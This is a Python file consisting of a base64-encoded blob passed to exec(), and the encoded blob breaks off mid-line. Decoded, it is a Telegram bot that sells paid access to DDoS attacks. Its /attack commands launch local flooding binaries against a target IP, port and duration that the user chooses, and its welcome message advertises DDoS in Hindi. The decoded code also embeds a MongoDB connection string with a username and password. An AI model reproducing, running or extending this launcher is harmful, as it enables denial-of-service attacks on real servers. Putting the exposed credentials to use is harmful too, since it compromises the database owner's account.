import base64
exec(base64.b64decode 
(b'aW1wb3J0IGFzeW5jaW8KaW1wb3J0IGxvZ2dpbmcKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHRpbWUKZnJvbSBweW1vbmdvIGltcG9ydCBNb25nb0NsaWVudApmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZSwgdGltZWRlbHRhCmltcG9ydCBjZXJ0aWZpCmltcG9ydCB0ZWxlYm90CmZyb20gdGVsZWJvdC50eXBlcyBpbXBvcnQgUmVwbHlLZXlib2FyZE1hcmt1cCwgS2V5Ym9hcmRCdXR0b24KZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZApmcm9tIHBhdGVsamlpIGltcG9ydCBUT0tFTiwgRk9SV0FSRF9DSEFOTkVMX0lELCBDSEFOTkVMX0lELCBFUlJPUl9DSEFOTkVMX0lEICAjIEltcG9ydGluZyBmcm9tIHBhdGVsamlpLnB5CgoKIyBNb25nb0RCIFVSSQpNT05HT19VUkkgPSAnbW9uZ29kYitzcnY6Ly9wYXRlbGppOnBhdGVsamlpQGNsdXN0ZXIwLmYyYmRpLm1vbmdvZGIubmV0L3BhdGVsamk/cmV0cnlXcml0ZXM9dHJ1ZSZ3PW1ham9yaXR5JmFwcE5hbWU9Q2x1c3RlcjAnCgojIFNldHVwCmxvb3AgPSBhc3luY2lvLmdldF9ldmVudF9sb29wKCkKCmxvZ2dpbmcuYmFzaWNDb25maWcoZm9ybWF0PSclKGFzY3RpbWUpcyAtICUobmFtZSlzIC0gJShsZXZlbG5hbWUpcyAtICUobWVzc2FnZSlzJywgbGV2ZWw9bG9nZ2luZy5JTkZPKQoKY2xpZW50ID0gTW9uZ29DbGllbnQoTU9OR09fVVJJLCB0bHNDQUZpbGU9Y2VydGlmaS53aGVyZSgpKQpkYiA9IGNsaWVudFsncGF0ZWxqaSddCnVzZXJzX2NvbGxlY3Rpb24gPSBkYi51c2VycwoKYm90ID0gdGVsZWJvdC5UZWxlQm90KFRPS0VOKQpSRVFVRVNUX0lOVEVSVkFMID0gMQoKYmxvY2tlZF9wb3J0cyA9IFs4NzAwLCAyMDAwMCwgNDQzLCAxNzUwMCwgOTAzMSwgMjAwMDIsIDIwMDAxXQoKcnVubmluZ19wcm9jZXNzZXMgPSBbXQoKYXN5bmMgZGVmIHJ1bl9hdHRhY2tfY29tbWFuZF9vbl9jb2Rlc3BhY2UodGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgZHVyYXRpb24pOgogICAgY29tbWFuZCA9IGYiLi9wYXRlbDIge3RhcmdldF9pcH0ge3RhcmdldF9wb3J0fSB7ZHVyYXRpb259IgogICAgdHJ5OgogICAgICAgIHByb2Nlc3MgPSBhd2FpdCBhc3luY2lvLmNyZWF0ZV9zdWJwcm9jZXNzX3NoZWxsKAogICAgICAgICAgICBjb21tYW5kLAogICAgICAgICAgICBzdGRvdXQ9YXN5bmNpby5zdWJwcm9jZXNzLlBJUEUsCiAgICAgICAgICAgIHN0ZGVycj1hc3luY2lvLnN1YnByb2Nlc3MuUElQRQogICAgICAgICkKICAgICAgICBydW5uaW5nX3Byb2Nlc3Nlcy5hcHBlbmQocHJvY2VzcykKICAgICAgICBzdGRvdXQsIHN0ZGVyciA9IGF3YWl0IHByb2Nlc3MuY29tbXVuaWNhdGUoKQogICAgICAgIG91dHB1dCA9IHN0ZG91dC5kZWNvZGUoKQogICAgICAgIGVycm9yID0gc3RkZXJyLmRlY29kZSgpCgogICAgICAgIGlmIG91dHB1dDoKICAgICAgICAgICAgbG9nZ2luZy5pbmZvKGYiQ29tbWFuZCBvdXRwdXQ6IHtvdXRwdXR9IikKICAgICAgICBpZiBlcnJvcjoKICAgICAgICAgICAgbG9nZ2luZy5lcnJvcihmIkNvbW1hbmQgZXJyb3I6IHtlcnJvcn0iKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dnaW5nLmVycm9yKGYiRmFpbGVkIHRvIGV4ZWN1dGUgY29tbWFuZCBvbiBDb2Rlc3BhY2U6IHtlfSIpCiAgICBmaW5hbGx5OgogICAgICAgIGlmIHByb2Nlc3MgaW4gcnVubmluZ19wcm9jZXNzZXM6CiAgICAgICAgICAgIHJ1bm5pbmdfcHJvY2Vzc2VzLnJlbW92ZShwcm9jZXNzKQoKYXN5bmMgZGVmIHJ1bl9hdHRhY2tfY29tbWFuZF9vbl9jb2Rlc3BhY2VfMih0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBkdXJhdGlvbik6CiAgICBjb21tYW5kID0gZiIuL3BhdGVsMSB7dGFyZ2V0X2lwfSB7dGFyZ2V0X3BvcnR9IHtkdXJhdGlvbn0iCiAgICB0cnk6CiAgICAgICAgcHJvY2VzcyA9IGF3YWl0IGFzeW5jaW8uY3JlYXRlX3N1YnByb2Nlc3Nfc2hlbGwoCiAgICAgICAgICAgIGNvbW1hbmQsCiAgICAgICAgICAgIHN0ZG91dD1hc3luY2lvLnN1YnByb2Nlc3MuUElQRSwKICAgICAgICAgICAgc3RkZXJyPWFzeW5jaW8uc3VicHJvY2Vzcy5QSVBFCiAgICAgICAgKQogICAgICAgIHJ1bm5pbmdfcHJvY2Vzc2VzLmFwcGVuZChwcm9jZXNzKQogICAgICAgIHN0ZG91dCwgc3RkZXJyID0gYXdhaXQgcHJvY2Vzcy5jb21tdW5pY2F0ZSgpCiAgICAgICAgb3V0cHV0ID0gc3Rkb3V0LmRlY29kZSgpCiAgICAgICAgZXJyb3IgPSBzdGRlcnIuZGVjb2RlKCkKCiAgICAgICAgaWYgb3V0cHV0OgogICAgICAgICAgICBsb2dnaW5nLmluZm8oZiJDb21tYW5kIG91dHB1dDoge291dHB1dH0iKQogICAgICAgIGlmIGVycm9yOgogICAgICAgICAgICBsb2dnaW5nLmVycm9yKGYiQ29tbWFuZCBlcnJvcjoge2Vycm9yfSIpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGxvZ2dpbmcuZXJyb3IoZiJGYWlsZWQgdG8gZXhlY3V0ZSBjb21tYW5kIG9uIENvZGVzcGFjZToge2V9IikKICAgIGZpbmFsbHk6CiAgICAgICAgaWYgcHJvY2VzcyBpbiBydW5uaW5nX3Byb2Nlc3NlczoKICAgICAgICAgICAgcnVubmluZ19wcm9jZXNzZXMucmVtb3ZlKHByb2Nlc3MpCgphc3luYyBkZWYgc3RhcnRfYXN5bmNpb19sb29wKCk6CiAgICB3aGlsZSBUcnVlOgogICAgICAgIGF3YWl0IGFzeW5jaW8uc2xlZXAoUkVRVUVTVF9JTlRFUlZBTCkKCmFzeW5jIGRlZiBydW5fYXR0YWNrX2NvbW1hbmRfYXN5bmModGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgZHVyYXRpb24pOgogICAgYXdhaXQgcnVuX2F0dGFja19jb21tYW5kX29uX2NvZGVzcGFjZSh0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBkdXJhdGlvbikKCmFzeW5jIGRlZiBydW5fYXR0YWNrX2NvbW1hbmRfYXN5bmNfMih0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBkdXJhdGlvbik6CiAgICBhd2FpdCBydW5fYXR0YWNrX2NvbW1hbmRfb25fY29kZXNwYWNlXzIodGFyZ2V0X2lwLCB0YXJnZXRfcG9ydCwgZHVyYXRpb24pCgpkZWYgaXNfdXNlcl9hZG1pbih1c2VyX2lkLCBjaGF0X2lkKToKICAgIHRyeToKICAgICAgICByZXR1cm4gYm90LmdldF9jaGF0X21lbWJlcihjaGF0X2lkLCB1c2VyX2lkKS5zdGF0dXMgaW4gWydhZG1pbmlzdHJhdG9yJywgJ2NyZWF0b3InXQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQoKZGVmIGNoZWNrX3VzZXJfYXBwcm92YWwodXNlcl9pZCk6CiAgICB1c2VyX2RhdGEgPSB1c2Vyc19jb2xsZWN0aW9uLmZpbmRfb25lKHsidXNlcl9pZCI6IHVzZXJfaWR9KQogICAgaWYgdXNlcl9kYXRhIGFuZCB1c2VyX2RhdGFbJ3BsYW4nXSA+IDA6CiAgICAgICAgcmV0dXJuIFRydWUKICAgIHJldHVybiBGYWxzZQoKZGVmIHNlbmRfbm90X2FwcHJvdmVkX21lc3NhZ2UoY2hhdF9pZCk6CiAgICBib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQsICcnJypAcGF0ZWxqaV80NyAK8J+kt+KAjeKZgO+4j/CdmYDwnZmt8J2ZlvCdmaLwnZml8J2ZofCdmZoKIFVzZSAvYXBwcm92ZSA8dXNlcl9pZD4gPHBsYW4+IDxkYXlzPiBvciAKL2Rpc2FwcHJvdmUgPHVzZXJfaWQ+LionJycsIHBhcnNlX21vZGU9J01hcmtkb3duJykKCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnYXBwcm92ZScsICdkaXNhcHByb3ZlJ10pCmRlZiBhcHByb3ZlX29yX2Rpc2FwcHJvdmVfdXNlcihtZXNzYWdlKToKICAgIHVzZXJfaWQgPSBtZXNzYWdlLmZyb21fdXNlci5pZAogICAgY2hhdF9pZCA9IG1lc3NhZ2UuY2hhdC5pZAogICAgaXNfYWRtaW4gPSBpc191c2VyX2FkbWluKHVzZXJfaWQsIENIQU5ORUxfSUQpCiAgICBjbWRfcGFydHMgPSBtZXNzYWdlLnRleHQuc3BsaXQoKQoKICAgIGlmIG5vdCBpc19hZG1pbjoKICAgICAgICBib3Quc2VuZF9tZXNzYWdlKGNoYXRfaWQsICcnJypQQVRFTGppXzQ3IEdvIGFuZCB0YWxrIHRvIFBhdGVsIGppIApETS0gQFBBVEVMamlfNDcKUGF0ZWwgamkgc2UgamFrYXIgYmFhdCBrYXIgCkRNLSBAUEFURUxqaV80NyonJycsIHBhcnNlX21vZGU9J01hcmtkb3duJykKICAgICAgICByZXR1cm4KCiAgICBpZiBsZW4oY21kX3BhcnRzKSA8IDI6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkLCAiKnBhdGVsamkgSW52YWxpZCBjb21tYW5kIGZvcm1hdC4gVXNlIC9hcHByb3ZlIDx1c2VyX2lkPiA8cGxhbj4gPGRheXM+IG9yIC9kaXNhcHByb3ZlIDx1c2VyX2lkPi4qIiwgcGFyc2VfbW9kZT0nTWFya2Rvd24nKQogICAgICAgIHJldHVybgoKICAgIGFjdGlvbiA9IGNtZF9wYXJ0c1swXQogICAgdGFyZ2V0X3VzZXJfaWQgPSBpbnQoY21kX3BhcnRzWzFdKQogICAgcGxhbiA9IGludChjbWRfcGFydHNbMl0pIGlmIGxlbihjbWRfcGFydHMpID49IDMgZWxzZSAwCiAgICBkYXlzID0gaW50KGNtZF9wYXJ0c1szXSkgaWYgbGVuKGNtZF9wYXJ0cykgPj0gNCBlbHNlIDAKCiAgICBpZiBhY3Rpb24gPT0gJy9hcHByb3ZlJzoKICAgICAgICBpZiBwbGFuID09IDE6ICAjIHBhdGVsamkKICAgICAgICAgICAgaWYgdXNlcnNfY29sbGVjdGlvbi5jb3VudF9kb2N1bWVudHMoeyJwbGFuIjogMX0pID49IDk5OgogICAgICAgICAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkLCAiKkFwcHJvdmFsIGZhaWxlZDogcGF0ZWxqaSBsaW1pdCByZWFjaGVkICg5OSB1c2VycykuKiIsIHBhcnNlX21vZGU9J01hcmtkb3duJykKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgIGVsaWYgcGxhbiA9PSAyOiAgIyBwYXRlbGppaQogICAgICAgICAgICBpZiB1c2Vyc19jb2xsZWN0aW9uLmNvdW50X2RvY3VtZW50cyh7InBsYW4iOiAyfSkgPj0gNDk5OgogICAgICAgICAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkLCAiKkFwcHJvdmFsIGZhaWxlZDogcGF0ZWxqaWkgbGltaXQgcmVhY2hlZCAoMCB1c2VycykuKiIsIHBhcnNlX21vZGU9J01hcmtkb3duJykKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICB2YWxpZF91bnRpbCA9IChkYXRldGltZS5ub3coKSArIHRpbWVkZWx0YShkYXlzPWRheXMpKS5kYXRlKCkuaXNvZm9ybWF0KCkgaWYgZGF5cyA+IDAgZWxzZSBkYXRldGltZS5ub3coKS5kYXRlKCkuaXNvZm9ybWF0KCkKICAgICAgICB1c2Vyc19jb2xsZWN0aW9uLnVwZGF0ZV9vbmUoCiAgICAgICAgICAgIHsidXNlcl9pZCI6IHRhcmdldF91c2VyX2lkfSwKICAgICAgICAgICAgeyIkc2V0IjogeyJwbGFuIjogcGxhbiwgInZhbGlkX3VudGlsIjogdmFsaWRfdW50aWwsICJhY2Nlc3NfY291bnQiOiAwfX0sCiAgICAgICAgICAgIHVwc2VydD1UcnVlCiAgICAgICAgKQogICAgICAgIG1zZ190ZXh0ID0gZiIqVXNlciB7dGFyZ2V0X3VzZXJfaWR9IGFwcHJvdmVkIHdpdGggcGxhbiB7cGxhbn0gZm9yIHtkYXlzfSBkYXlzLioiCiAgICBlbHNlOiAgIyBkaXNhcHByb3ZlCiAgICAgICAgdXNlcnNfY29sbGVjdGlvbi51cGRhdGVfb25lKAogICAgICAgICAgICB7InVzZXJfaWQiOiB0YXJnZXRfdXNlcl9pZH0sCiAgICAgICAgICAgIHsiJHNldCI6IHsicGxhbiI6IDAsICJ2YWxpZF91bnRpbCI6ICIiLCAiYWNjZXNzX2NvdW50IjogMH19LAogICAgICAgICAgICB1cHNlcnQ9VHJ1ZQogICAgICAgICkKICAgICAgICBtc2dfdGV4dCA9IGYiKlVzZXIge3RhcmdldF91c2VyX2lkfSBkaXNhcHByb3ZlZCBhbmQgcmV2ZXJ0ZWQgdG8gZnJlZS4qIgoKICAgIGJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZCwgbXNnX3RleHQsIHBhcnNlX21vZGU9J01hcmtkb3duJykKICAgIGJvdC5zZW5kX21lc3NhZ2UoQ0hBTk5FTF9JRCwgbXNnX3RleHQsIHBhcnNlX21vZGU9J01hcmtkb3duJykKCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnYXR0YWNrJ10pCmRlZiBhdHRhY2tfY29tbWFuZChtZXNzYWdlKToKICAgIHVzZXJfaWQgPSBtZXNzYWdlLmZyb21fdXNlci5pZAogICAgY2hhdF9pZCA9IG1lc3NhZ2UuY2hhdC5pZAoKICAgIGlmIG5vdCBjaGVja191c2VyX2FwcHJvdmFsKHVzZXJfaWQpOgogICAgICAgIHNlbmRfbm90X2FwcHJvdmVkX21lc3NhZ2UoY2hhdF9pZCkKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShjaGF0X2lkLCAnJycqcGF0ZWxqaSDwn5qAMfCfmoAgCvCfpLfigI3imYDvuI/wnZmA8J2ZrfCdmZbwnZmi8J2ZpfCdmaHwnZmaICAgMjAuMjM1Ljk0LjIzNyAxNzg3MCAxODAKPHRhcmdldD4gPHBvcnQ+IDx0aW1lPgpCeSBAcGF0ZWxqaV80NyonJycsIHBhcnNlX21vZGU9J01hcmtkb3duJykKICAgICAgICBib3QucmVnaXN0ZXJfbmV4dF9zdGVwX2hhbmRsZXIobWVzc2FnZSwgcHJvY2Vzc19hdHRhY2tfY29tbWFuZCkKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dnaW5nLmVycm9yKGYiRXJyb3IgaW4gYXR0YWNrIGNvbW1hbmQ6IHtlfSIpCgpAYm90Lm1lc3NhZ2VfaGFuZGxlcihjb21tYW5kcz1bJ2F0dGFjazInXSkKZGVmIGF0dGFja19jb21tYW5kXzIobWVzc2FnZSk6CiAgICB1c2VyX2lkID0gbWVzc2FnZS5mcm9tX3VzZXIuaWQKICAgIGNoYXRfaWQgPSBtZXNzYWdlLmNoYXQuaWQKCiAgICBpZiBub3QgY2hlY2tfdXNlcl9hcHByb3ZhbCh1c2VyX2lkKToKICAgICAgICBzZW5kX25vdF9hcHByb3ZlZF9tZXNzYWdlKGNoYXRfaWQpCiAgICAgICAgcmV0dXJuCgogICAgdHJ5OgogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UoY2hhdF9pZCwgJycnKnBhdGVsamkg8J+agDLwn5qAIArwn6S34oCN4pmA77iP8J2ZgPCdma3wnZmW8J2ZovCdmaXwnZmh8J2ZmiAgIDIwLjIzNS45NC4yMzcgMTc4NzAgMTgwCjx0YXJnZXQ+IDxwb3J0PiA8dGltZT4KQnkgQHBhdGVsamlfNDcqJycnLCBwYXJzZV9tb2RlPSdNYXJrZG93bicpCiAgICAgICAgYm90LnJlZ2lzdGVyX25leHRfc3RlcF9oYW5kbGVyKG1lc3NhZ2UsIHByb2Nlc3NfYXR0YWNrX2NvbW1hbmRfMikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dnaW5nLmVycm9yKGYiRXJyb3IgaW4gYXR0YWNrIGNvbW1hbmQgMjoge2V9IikKCmRlZiBwcm9jZXNzX2F0dGFja19jb21tYW5kKG1lc3NhZ2UpOgogICAgdHJ5OgogICAgICAgIGFyZ3MgPSBtZXNzYWdlLnRleHQuc3BsaXQoKQogICAgICAgIGlmIGxlbihhcmdzKSAhPSAzOgogICAgICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgJycnKktZQSBLQVIgUkFIQSBIQUkgYmhhaSBETS06IEBwYXRlbGppXzQ3Cjx0YXJnZXQ+IDxwb3J0PiA8dGltZT4gKicnJywgcGFyc2VfbW9kZT0nTWFya2Rvd24nKQogICAgICAgICAgICByZXR1cm4KICAgICAgICB0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBkdXJhdGlvbiA9IGFyZ3NbMF0sIGludChhcmdzWzFdKSwgYXJnc1syXQoKICAgICAgICBpZiB0YXJnZXRfcG9ydCBpbiBibG9ja2VkX3BvcnRzOgogICAgICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgZiIqUG9ydCB7dGFyZ2V0X3BvcnR9IGlzIGJsb2NrZWQuIFBsZWFzZSB1c2UgYSBkaWZmZXJlbnQgcG9ydC4qIiwgcGFyc2VfbW9kZT0nTWFya2Rvd24nKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBSdW4gdGhlIGZpcnN0IGJpbmFyeQogICAgICAgIGFzeW5jaW8ucnVuX2Nvcm91dGluZV90aHJlYWRzYWZlKHJ1bl9hdHRhY2tfY29tbWFuZF9hc3luYyh0YXJnZXRfaXAsIHRhcmdldF9wb3J0LCBkdXJhdGlvbiksIGxvb3ApCiAgICAgICAgdXNlcm5hbWUgPSBtZXNzYWdlLmZyb21fdXNlci51c2VybmFtZQogICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCBmIipTVUNDRVNTXG5cbkhvc3Q6IHt0YXJnZXRfaXB9Ont0YXJnZXRfcG9ydH1cblRpbWU6IHtkdXJhdGlvbn0gc2Vjb25kc1xuTmFtZToge3VzZXJuYW1lfSoiLCBwYXJzZV9tb2RlPSdNYXJrZG93bicpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgbG9nZ2luZy5lcnJvcihmIkVycm9yIGluIHByb2Nlc3NpbmcgYXR0YWNrIGNvbW1hbmQ6IHtlfSIpCgpkZWYgcHJvY2Vzc19hdHRhY2tfY29tbWFuZF8yKG1lc3NhZ2UpOgogICAgdHJ5OgogICAgICAgIGFyZ3MgPSBtZXNzYWdlLnRleHQuc3BsaXQoKQogICAgICAgIGlmIGxlbihhcmdzKSAhPSAzOgogICAgICAgICAgICBib3Quc2VuZF9tZXNzYWdlKG1lc3NhZ2UuY2hhdC5pZCwgJycnKktZQSBLQVIgUkFIQSBIQUkgYmhhaSBETS06IEBwYXRlbGppXzQ3Cjx0YXJnZXQ+IDxwb3J0PiA8dGltZT4qJycnLCBwYXJzZV9tb2RlPSdNYXJrZG93bicpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGR1cmF0aW9uID0gYXJnc1swXSwgaW50KGFyZ3NbMV0pLCBhcmdzWzJdCgogICAgICAgIGlmIHRhcmdldF9wb3J0IGluIGJsb2NrZWRfcG9ydHM6CiAgICAgICAgICAgIGJvdC5zZW5kX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkLCBmIipQb3J0IHt0YXJnZXRfcG9ydH0gaXMgYmxvY2tlZC4gUGxlYXNlIHVzZSBhIGRpZmZlcmVudCBwb3J0LioiLCBwYXJzZV9tb2RlPSdNYXJrZG93bicpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICAjIFJ1biB0aGUgc2Vjb25kIGJpbmFyeQogICAgICAgIGFzeW5jaW8ucnVuX2Nvcm91dGluZV90aHJlYWRzYWZlKHJ1bl9hdHRhY2tfY29tbWFuZF9hc3luY18yKHRhcmdldF9pcCwgdGFyZ2V0X3BvcnQsIGR1cmF0aW9uKSwgbG9vcCkKICAgICAgICB1c2VybmFtZSA9IG1lc3NhZ2UuZnJvbV91c2VyLnVzZXJuYW1lCiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsIGYiKlNVQ0NFU1NcblxuSG9zdDoge3RhcmdldF9pcH06e3RhcmdldF9wb3J0fVxuVGltZToge2R1cmF0aW9ufSBzZWNvbmRzXG5OYW1lOiB7dXNlcm5hbWV9KiIsIHBhcnNlX21vZGU9J01hcmtkb3duJykKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBsb2dnaW5nLmVycm9yKGYiRXJyb3IgaW4gcHJvY2Vzc2luZyBhdHRhY2sgY29tbWFuZCAyOiB7ZX0iKQoKZGVmIHN0YXJ0X2FzeW5jaW9fdGhyZWFkKCk6CiAgICBhc3luY2lvLnNldF9ldmVudF9sb29wKGxvb3ApCiAgICBsb29wLnJ1bl91bnRpbF9jb21wbGV0ZShzdGFydF9hc3luY2lvX2xvb3AoKSkKCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnc3RhcnQnXSkKZGVmIHNlbmRfd2VsY29tZShtZXNzYWdlKToKICAgICMgQ3JlYXRlIGEgbWFya3VwIG9iamVjdAogICAgbWFya3VwID0gUmVwbHlLZXlib2FyZE1hcmt1cChyb3dfd2lkdGg9MiwgcmVzaXplX2tleWJvYXJkPVRydWUsIG9uZV90aW1lX2tleWJvYXJkPVRydWUpCgogICAgIyBDcmVhdGUgYnV0dG9ucwogICAgYnRuMSA9IEtleWJvYXJkQnV0dG9uKCJwYXRlbGppIPCfmoAx8J+agCIpCiAgICBidG4yID0gS2V5Ym9hcmRCdXR0b24oInBhdGVsamkg8J+agDLwn5qAIikKICAgIGJ0bjMgPSBLZXlib2FyZEJ1dHRvbigiTVkgSU5GTyIpCgogICAgIyBBZGQgYnV0dG9ucyB0byB0aGUgbWFya3VwCiAgICBtYXJrdXAuYWRkKGJ0bjEsIGJ0bjIsIGJ0bjMpCgogICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsICcnJypCeSAgaHR0cHM6Ly90Lm1lL3BhdGVsX2ppNDcgICA6CiDimKDvuI9AUEFURUxKSV80N+KYoO+4jwrioIDioIDioIDio7Tio77io7/io7/io7bioYTioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qK44qO/4qO/4qO/4qO/4qO/4qO/4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKgiOKiv+Kjv+Kjv+Kjv+Kjv+Kgj+KggOKggOKggOKggOKggOKggOKggOKggOKggOKggArioIDioIDioIDioIDioIjio4nio6nio4DioYDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIDioIAK4qCA4qCA4qCA4qCA4qO84qO/4qO/4qO/4qO34qGA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qCACuKggOKggOKigOKjvOKjv+Kjv+Kjv+Kjv+Kjv+Khh+KggOKggOKggOKggOKggOKggOKggOKggOKggArioIDiooDio77io7/io7/io7/io7/io7/io7/io7fCoMKgwqDCoHNjYW1tZXLwn5GH8J+Pu8KgwqDCoMKgwqDCoCAK4qKg4qO+4qO/4qO/4qCJ4qO/4qO/4qO/4qO/4qO/4qGE4qCA4qKA4qOg4qOk4qOk4qOA4qCA4qCA4qCACuKggOKgmeKjv+Kjv+Kjp+Kjv+Kjv+Kjv+Kjv+Kjv+Khh+KioOKjv+Kjv+Kjv+Kjv+Kjv+Kjp+KggOKggArioIDioIDioIjioLvio7/io7/io7/io7/io7/io7/io7fioLjio7/io7/io7/io7/io7/iob/ioIDioIAK4qCA4qCA4qCA4qCA4qCY4qC/4qK/4qO/4qO/4qO/4qO/4qGE4qCZ4qC74qC/4qC/4qCb4qCB4qCA4qCACuKggOKggOKggOKggOKggOKggOKggOKhn+KjqeKjneKiv+KggOKggOKjoOKjtuKjtuKjpuKhgOKggOKggArioIDioIDioIDioIDioIDioIDioIDio7fioZ3io7/io6bio6Dio77io7/io7/io7/io7/io7fioYDioIAK4qCA4qCA4qCA4qCA4qCA4qCA4qCA4qO/4qO/4qOu4qK74qO/4qCf4qO/4qO/4qO/4qO/4qO/4qO34qCACuKggOKggOKggOKggOKggOKggOKggOKjv+Kjv+Kjv+Khh+KggOKggOKgu+Kgv+Kgu+Kjv+Kjv+Kjv+KggArioIDioIDioIDioIDioIDioIDiorDio7/io7/io7/ioIfioIDioIDioIDioIDioIDioJjio7/io7/io78K4qCA4qCA4qCA4qCA4qCA4qCA4qK44qO/4qO/4qO/4qCA4qCA4qCA4qCA4qCA4qCA4qOg4qO+4qO/4qCACuKggOKggOKggOKggOKggOKggOKiuOKjv+Kjv+Khv+KggOKggOKggOKigOKjtOKjv+Kjv+Kjv+Kjv+KggArioIDioIDioIDioIDioIDioIDioLnio7/io7/ioIfioIDioIDioIDioLjio7/io7/io7/io7/io7/io7/io7/io7/io78KICAgIAogIPCfmIpTaXIsICDgpJfgpY3gpLDgpYHgpKog4KSu4KWH4KSCIOCkhuCkqiDgpLbgpL7gpK7gpL/gpLIg4KS54KWL4KSCLCDgpK7gpYHgpKvgpLzgpY3gpKQgRERPUyDgpIngpKrgpLLgpKzgpY3gpKcg4KS54KWICvCfkYfwn5GH8J+Rh/CfkYfwn5GH8J+Rh/CfkYfwn5GH8J+RhwogaHR0cHM6Ly90Lm1lL2FkZGxpc3QvVW1DNG9ISnZnZ3lOVEExCiAgICAgICAgICAgICAgICAgICAgIAogaHR0cHM6Ly90Lm1lL2FkZGxpc3QvVW1DNG9ISnZnZ3lOVEExKicnJywgcmVwbHlfbWFya3VwPW1hcmt1cCwgcGFyc2VfbW9kZT0nTWFya2Rvd24nKQoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoZnVuYz1sYW1iZGEgbWVzc2FnZTogVHJ1ZSkKZGVmIGhhbmRsZV9tZXNzYWdlKG1lc3NhZ2UpOgogICAgaWYgbm90IGNoZWNrX3VzZXJfYXBwcm92YWwobWVzc2FnZS5mcm9tX3VzZXIuaWQpOgogICAgICAgIHNlbmRfbm90X2FwcHJvdmVkX21lc3NhZ2UobWVzc2FnZS5jaGF0LmlkKQogICAgICAgIHJldHVybgoKICAgIGlmIG1lc3NhZ2UudGV4dCA9PSAicGF0ZWxqaSI6CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICIqSW5zdGFudCBQbGFuIHNlbGVjdGVkKiIsIHBhcnNlX21vZGU9J01hcmtkb3duJykKICAgIGVsaWYgbWVzc2FnZS50ZXh0ID09ICJwYXRlbGppIPCfmoAx8J+agCI6CiAgICAgICAgYXR0YWNrX2NvbW1hbmQobWVzc2FnZSkKICAgIGVsaWYgbWVzc2FnZS50ZXh0ID09ICJwYXRlbGppIPCfmoAy8J+agCI6CiAgICAgICAgYXR0YWNrX2NvbW1hbmRfMihtZXNzYWdlKQogICAgZWxpZiBtZXNzYWdlLnRleHQgPT0gIkNhbmFyeSBEb3dubG9hZOKclO+4jyI6CiAgICAgICAgYm90LnNlbmRfbWVzc2FnZShtZXNzYWdlLmNoYXQuaWQsICIqUGxlYXNlIHVzZSB0aGUgZm9sbG93aW5nIGxpbmsgZm9yIENhbmFyeSBEb3dubG9hZDogaHR0cHMqIiwgcGFyc2VfbW9kZT0nTWFya2Rvd24nKQogICAgZWxpZiBtZXNzYWdlLnRleHQgPT0gIk1ZIElORk8iOgogICAgICAgIHVzZXJfaWQgPSBtZXNzYWdlLmZyb21fdXNlci5pZAogICAgICAgIHVzZXJfZGF0YSA9IHVzZXJzX2NvbGxlY3Rpb24uZmluZF9vbmUoeyJ1c2VyX2lkIjogdXNlcl9pZH0pCiAgICAgICAgaWYgdXNlcl9kYXRhOgogICAgICAgICAgICB1c2VybmFtZSA9IG1lc3NhZ2UuZnJvbV91c2VyLnVzZXJuYW1lCiAgICAgICAgICAgIHBsYW4gPSB1c2VyX2RhdGEuZ2V0KCdwbGFuJywgJ04vQScpCiAgICAgICAgICAgIHVzZXJfaWQgPSBtZXNzYWdlLmZyb21fdXNlci5pZAogICAgICAgICAgICB2YWxpZF91bnRpbCA9IHVzZXJfZGF0YS5nZXQoJ3ZhbGlkX3VudGlsJywgJ04vQScpCiAgICAgICAgICAgIGN1cnJlbnRfdGltZSA9IGRhdGV0aW1lLm5vdygpLmlzb2Zvcm1hdCgpCiAgICAgICAgICAgIHJlc3BvbnNlID0gKGY